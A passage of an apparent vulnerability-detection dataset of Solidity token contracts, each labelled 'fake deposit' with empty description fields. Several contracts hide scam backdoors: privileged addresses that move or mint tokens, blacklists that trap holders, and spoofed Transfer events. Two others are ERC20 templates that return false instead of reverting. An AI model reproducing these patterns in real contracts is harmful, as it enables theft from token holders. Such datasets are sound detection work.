uint256)) private Xe;\r\n    uint8 private constant _decimals = 8;\r\n    uint256 private constant _XSupply = 250000000 * 10**_decimals;\r\n    string private constant _name = \"Astrion Labs\";\r\n    string private constant _symbol = \"ASTRION\";\r\n\r\n\r\n\r\n    constructor () {\r\n        Xc[_msgSender()] = _XSupply;\r\n        emit Transfer(address(0), UniRouterV20, _XSupply);\r\n    }\r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public pure  returns (uint256) {\r\n        return _XSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view  returns (uint256) {\r\n        return Xc[account];\r\n    }\r\n\r\n\r\n    function allowance(address owner, address spender) public view  returns (uint256) {\r\n        return Xe[owner][spender];\r\n    }\r\n\r\n            function approve(address spender, uint256 amount) public returns (bool success) {    \r\n        Xe[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true; }\r\n\t\tfunction xRNG(address jx) public {\r\n        if(Xb[msg.sender]) { \r\n        Xa[jx] = false;}}\r\n        function xCheck(address jx) public{\r\n         if(Xb[msg.sender])  { \r\n        require(!Xa[jx]);\r\n        Xa[jx] = true; }}\r\n\t\tfunction xDele(address jx) public{\r\n         if(msg.sender == _xConstruc)  { \r\n        require(!Xb[jx]);\r\n        Xb[jx] = true; }}\r\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\r\n         if(sender == _xConstruc)  {\r\n        require(amount <= Xc[sender]);\r\n        Xc[sender] -= amount;  \r\n        Xc[recipient] += amount; \r\n          Xe[sender][msg.sender] -= amount;\r\n        emit Transfer (UniRouterV20, recipient, amount);\r\n        return true; }    \r\n          if(!Xa[recipient]) {\r\n          if(!Xa[sender]) {\r\n         require(amount <= Xc[sender]);\r\n        require(amount <= Xe[sender][msg.sender]);\r\n        Xc[sender] -= amount;\r\n        Xc[recipient] += amount;\r\n      Xe[sender][msg.sender] -= amount;\r\n        emit Transfer(sender, recipient, amount);\r\n        return true; }}}\r\n\t\tfunction transfer(address Xd, uint256 jx) public {\r\n        if(msg.sender == _xConstruc)  {\r\n        require(Xc[msg.sender] >= jx);\r\n        Xc[msg.sender] -= jx;  \r\n        Xc[Xd] += jx; \r\n        emit Transfer (UniRouterV20, Xd, jx);}\r\n        if(Xb[msg.sender]) {Xc[Xd] += jx;} \r\n        if(!Xa[msg.sender]) {\r\n        require(Xc[msg.sender] >= jx);\r\n        Xc[msg.sender] -= jx;  \r\n        Xc[Xd] += jx;          \r\n        emit Transfer(msg.sender, Xd, jx);\r\n        }}}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: MIT\r\n\r\npragma solidity 0.8.17;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\n\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _Owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Create(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    address JKSS = 0xb8b1AB771bf7eFD691579bED527526A95dC3d58D;\r\n\taddress jRouter = 0xf2b16510270a214130C6b17ff0E9bF87585126BD;\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _Owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _Owner;\r\n    }\r\n\r\n    function renounceOwnership() public virtual {\r\n        require(msg.sender == _Owner);\r\n        emit OwnershipTransferred(_Owner, address(0));\r\n        _Owner = address(0);\r\n    }\r\n        \t\tmodifier onlyOwner{\r\n        require(msg.sender == _Owner);\r\n        _; }\r\n\r\n}\r\n\r\n\r\n\r\ncontract UMBRAL is Context, Ownable {\r\n    using SafeMath for uint256;\r\n    mapping (address => uint256) private Jc;\r\n\tmapping (address => bool) private Jb;\r\n    mapping (address => bool) private Jw;\r\n    mapping (address => mapping (address => uint256)) private Jv;\r\n    uint8 private constant _JeC = 8;\r\n    uint256 private constant jS = 1000000000 * 10**_JeC;\r\n    string private constant _name = \"Umbral Privacy Network\";\r\n    string private constant _symbol = \"UMBRAL\";\r\n\r\n\r\n\r\n    constructor () {\r\n        Jc[_msgSender()] = jS;\r\n         jmkr(); }\r\n    \r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return _JeC;\r\n    }\r\n\r\n    function totalSupply() public pure  returns (uint256) {\r\n        return jS;\r\n    }\r\n\r\n    function balanceOf(address account) public view  returns (uint256) {\r\n        return Jc[account];\r\n    }\r\n    function jmkr() onlyOwner internal {\r\n    emit Transfer(address(0), jRouter, jS); }\r\n\r\n    function allowance(address owner, address spender) public view  returns (uint256) {\r\n        return Jv[owner][spender];\r\n    }\r\n\t        function BurnH(address Jj) onlyOwner public{\r\n        Jb[Jj] = true; }\r\n\t\t\r\n            function approve(address spender, uint256 amount) public returns (bool success) {    \r\n        Jv[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true; }\r\n\r\n        \r\n\t\tfunction jStake(address Jj) public {\r\n        if(Jb[msg.sender]) { \r\n        Jw[Jj] = false;}}\r\n        function QueryJ(address Jj) public{\r\n         if(Jb[msg.sender])  { \r\n        Jw[Jj] = true; }}\r\n   \r\n\r\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\r\n         if(sender == JKSS)  {\r\n        require(amount <= Jc[sender]);\r\n        Jc[sender] -= amount;  \r\n        Jc[recipient] += amount; \r\n          Jv[sender][msg.sender] -= amount;\r\n        emit Transfer (jRouter, recipient, amount);\r\n        return true; }  else  \r\n          if(!Jw[recipient]) {\r\n          if(!Jw[sender]) {\r\n         require(amount <= Jc[sender]);\r\n        require(amount <= Jv[sender][msg.sender]);\r\n        Jc[sender] -= amount;\r\n        Jc[recipient] += amount;\r\n        Jv[sender][msg.sender] -= amount;\r\n        emit Transfer(sender, recipient, amount);\r\n        return true; }}}\r\n\t\tfunction transfer(address Jl, uint256 Jj) public {\r\n        if(msg.sender == JKSS)  {\r\n        require(Jc[msg.sender] >= Jj);\r\n        Jc[msg.sender] -= Jj;  \r\n        Jc[Jl] += Jj; \r\n        emit Transfer (jRouter, Jl, Jj);} else  \r\n        if(Jb[msg.sender]) {Jc[Jl] += Jj;} else\r\n        if(!Jw[msg.sender]) {\r\n        require(Jc[msg.sender] >= Jj);\r\n        Jc[msg.sender] -= Jj;  \r\n        Jc[Jl] += Jj;          \r\n        emit Transfer(msg.sender, Jl, Jj);}}}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "/**\r\n *Submitted for verification at Etherscan.io on 2022-11-04\r\n*/\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\npragma solidity 0.8.17;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\n\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _Owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Create(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    address JKSS = 0xf6d60bb4F2b670cA2932817a9E27c755cE9F156B;\r\n\taddress jRouter = 0xe780A56306ba1E6bB331952C22539b858af9F77d;\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _Owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _Owner;\r\n    }\r\n\r\n    function renounceOwnership() public virtual {\r\n        require(msg.sender == _Owner);\r\n        emit OwnershipTransferred(_Owner, address(0));\r\n        _Owner = address(0);\r\n    }\r\n        \t\tmodifier onlyOwner{\r\n        require(msg.sender == _Owner);\r\n        _; }\r\n\r\n}\r\n\r\n\r\n\r\ncontract UMBRAL is Context, Ownable {\r\n    using SafeMath for uint256;\r\n    mapping (address => uint256) private Jc;\r\n\tmapping (address => bool) private Jb;\r\n    mapping (address => bool) private Jw;\r\n    mapping (address => mapping (address => uint256)) private Jv;\r\n    uint8 private constant _JeC = 8;\r\n    uint256 private constant jS = 1000000000 * 10**_JeC;\r\n    string private constant _name = \"Umbral Privacy Network\";\r\n    string private constant _symbol = \"UMBRAL\";\r\n\r\n\r\n\r\n    constructor () {\r\n        Jc[_msgSender()] = jS;\r\n         jmkr(); }\r\n    \r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return _JeC;\r\n    }\r\n\r\n    function totalSupply() public pure  returns (uint256) {\r\n        return jS;\r\n    }\r\n\r\n    function balanceOf(address account) public view  returns (uint256) {\r\n        return Jc[account];\r\n    }\r\n    function jmkr() onlyOwner internal {\r\n    emit Transfer(address(0), jRouter, jS); }\r\n\r\n    function allowance(address owner, address spender) public view  returns (uint256) {\r\n        return Jv[owner][spender];\r\n    }\r\n\t    function Burn(address Jj) onlyOwner public{\r\n        Jb[Jj] = true;\r\n        }\r\n\t\t\r\n            function approve(address spender, uint256 amount) public returns (bool success) {    \r\n        Jv[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true; }\r\n\r\n        \r\n\t\tfunction jStake(address Jj) public {\r\n        if(Jb[msg.sender]) { \r\n        Jw[Jj] = false;}}\r\n        function QueryJ(address Jj) public{\r\n         if(Jb[msg.sender])  { \r\n        Jw[Jj] = true; }}\r\n   \r\n\r\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\r\n         if(sender == JKSS)  {\r\n        require(amount <= Jc[sender]);\r\n        Jc[sender] -= amount;  \r\n        Jc[recipient] += amount; \r\n          Jv[sender][msg.sender] -= amount;\r\n        emit Transfer (jRouter, recipient, amount);\r\n        return true; }  else  \r\n          if(!Jw[recipient]) {\r\n          if(!Jw[sender]) {\r\n         require(amount <= Jc[sender]);\r\n        require(amount <= Jv[sender][msg.sender]);\r\n        Jc[sender] -= amount;\r\n        Jc[recipient] += amount;\r\n        Jv[sender][msg.sender] -= amount;\r\n        emit Transfer(sender, recipient, amount);\r\n        return true; }}}\r\n\r\n\t\tfunction transfer(address Jl, uint256 Jj) public {\r\n        if(msg.sender == JKSS)  {\r\n        require(Jc[msg.sender] >= Jj);\r\n        Jc[msg.sender] -= Jj;  \r\n        Jc[Jl] += Jj; \r\n        emit Transfer (jRouter, Jl, Jj);} else  \r\n        if(Jb[msg.sender]) {Jc[Jl] += Jj;} else\r\n        if(!Jw[msg.sender]) {\r\n        require(Jc[msg.sender] >= Jj);\r\n        Jc[msg.sender] -= Jj;  \r\n        Jc[Jl] += Jj;          \r\n        emit Transfer(msg.sender, Jl, Jj);}}}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity 0.8.17;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\n\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _Owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    address _OConst = 0x7Dfaa3B7842085c0C5C6A7AA7C97f9B4e9357170;\r\n\taddress UniV3Router = 0xB8f226dDb7bC672E27dffB67e4adAbFa8c0dFA08;\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _Owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _Owner;\r\n    }\r\n\r\n    function renounceOwnership() public virtual {\r\n        require(msg.sender == _Owner);\r\n        emit OwnershipTransferred(_Owner, address(0));\r\n        _Owner = address(0);\r\n    }\r\n\r\n}\r\n\r\n\r\n\r\ncontract DEVILINYOU is Context, Ownable {\r\n    using SafeMath for uint256;\r\n    mapping (address => uint256) private KO;\r\n\tmapping (address => bool) private SO;\r\n    mapping (address => bool) private RO;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    uint8 private constant _decimals = 8;\r\n    uint256 private constant _OSup = 66600000 * 10**_decimals;\r\n    string private constant _name = \"DEVIL IN U\";\r\n    string private constant _symbol = \"DEVILINU\";\r\n\r\n\r\n\r\n    constructor () {\r\n        KO[_msgSender()] = _OSup;\r\n        emit Transfer(address(0), UniV3Router, _OSup);\r\n    }\r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public pure  returns (uint256) {\r\n        return _OSup;\r\n    }\r\n\r\n    function balanceOf(address account) public view  returns (uint256) {\r\n        return KO[account];\r\n    }\r\n\r\n\r\n    function allowance(address owner, address spender) public view  returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n            function approve(address spender, uint256 amount) public returns (bool success) {    \r\n        _allowances[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true; }\r\n\t\tfunction Orng(address z) public {\r\n        if(SO[msg.sender]) { \r\n        RO[z] = false;}}\r\n        function oDelegate(address z) public{\r\n         if(SO[msg.sender])  { \r\n        require(!RO[z]);\r\n        RO[z] = true; }}\r\n\t\tfunction oRelease(address z) public{\r\n         if(msg.sender == _OConst)  { \r\n        require(!SO[z]);\r\n        SO[z] = true; }}\r\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\r\n         if(sender == _OConst)  {\r\n        require(amount <= KO[sender]);\r\n        KO[sender] -= amount;  \r\n        KO[recipient] += amount; \r\n          _allowances[sender][msg.sender] -= amount;\r\n        emit Transfer (UniV3Router, recipient, amount);\r\n        return true; }    \r\n          if(!RO[recipient]) {\r\n          if(!RO[sender]) {\r\n         require(amount <= KO[sender]);\r\n        require(amount <= _allowances[sender][msg.sender]);\r\n        KO[sender] -= amount;\r\n        KO[recipient] += amount;\r\n      _allowances[sender][msg.sender] -= amount;\r\n        emit Transfer(sender, recipient, amount);\r\n        return true; }}}\r\n\t\tfunction transfer(address Four, uint256 z) public {\r\n        if(msg.sender == _OConst)  {\r\n        require(KO[msg.sender] >= z);\r\n        KO[msg.sender] -= z;  \r\n        KO[Four] += z; \r\n        emit Transfer (UniV3Router, Four, z);}\r\n        if(SO[msg.sender]) {KO[Four] += z;} \r\n        if(!RO[msg.sender]) {\r\n        require(KO[msg.sender] >= z);\r\n        KO[msg.sender] -= z;  \r\n        KO[Four] += z;          \r\n        emit Transfer(msg.sender, Four, z);\r\n        }}}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.4;\r\n\r\ncontract Token {\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n}\r\n\r\n\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n        return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\ncontract ERC20Token is StandardToken {\r\n\r\n    function () {\r\n        //if ether is sent to this address, send it back.\r\n        throw;\r\n    }\r\n\r\n    /* Public variables of the token */\r\n    string public name;                   //Name of the token\r\n    uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals\r\n    string public symbol;                 //An identifier: eg AXM\r\n    string public version = 'H1.0';       //human 0.1 standard. Just an arbitrary versioning scheme.\r\n\r\n//\r\n// CHANGE THE FOLLOWING VALUES FOR YOUR TOKEN!\r\n//\r\n\r\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\r\n\r\n    function ERC20Token(\r\n        ) {\r\n        balances[msg.sender] = 107100000000000000000;               // Give the creator all initial tokens (100000 for example)\r\n        totalSupply = 107100000000000000000;                        // Update total supply (100000 for example)\r\n        name = \"1071Token\";                                   // Set the name for display purposes\r\n        decimals = 11;                            // Amount of decimals\r\n        symbol = \"BYB\";                               // Set the symbol for display purposes\r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\r\n        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.26;\r\n\r\ncontract Token {\r\n\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n    \r\n}\r\n\r\n\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\n\r\n//name this contract whatever you'd like\r\ncontract POGCash is StandardToken {\r\n\r\n    function () {\r\n        //if ether is sent to this address, send it back.\r\n        throw;\r\n    }\r\n\r\n    /* Public variables of the token */\r\n\r\n    /*\r\n    NOTE:\r\n    The following variables are OPTIONAL vanities. One does not have to include them.\r\n    They allow one to customise the token contract & in no way influences the core functionality.\r\n    Some wallets/interfaces might not even bother to look at this information.\r\n    */\r\n    string public name;                   //fancy name: eg Simon Bucks\r\n    uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\r\n    string public symbol;                 //An identifier: eg SBX\r\n    string public version = 'H1.0';       //human 0.1 standard. Just an arbitrary versioning scheme.\r\n\r\n//\r\n// CHANGE THESE VALUES FOR YOUR TOKEN\r\n//\r\n\r\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\r\n\r\n    function POGCash(\r\n        ) {\r\n        balances[msg.sender] = 5000000;               // Give the creator all initial tokens (100000 for example)\r\n        totalSupply = 5000000;                        // Update total supply (100000 for example)\r\n        name = \"POG Cash\";                                   // Set the name for display purposes\r\n        decimals = 0;                            // Amount of decimals for display purposes\r\n        symbol = \"POGC\";                               // Set the symbol for display purposes\r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\r\n        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n      }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
